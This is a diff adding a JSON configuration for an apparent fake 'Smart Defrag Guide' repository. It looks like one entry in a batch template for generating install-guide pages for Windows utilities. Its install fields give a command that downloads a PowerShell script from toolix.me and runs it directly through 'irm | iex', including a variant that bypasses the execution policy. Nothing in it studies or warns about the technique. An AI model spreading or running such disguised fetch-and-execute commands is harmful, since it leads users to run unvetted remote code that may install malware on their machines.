@@ -1,0 +1,26 @@
+{
+  "repo": "Smart-Defrag-Guide",
+  "product": "Smart Defrag Guide",
+  "product_title": "Smart Defrag Guide",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-smart-defrag-guide",
+    "smart-defrag-guide-app",
+    "repository-readme",
+    "install-guide",
+    "desktop-software",
+    "smart-defrag-guide-desktop-tool",
+    "smart-defrag-guide-windows-tool",
+    "smart-defrag-guide",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
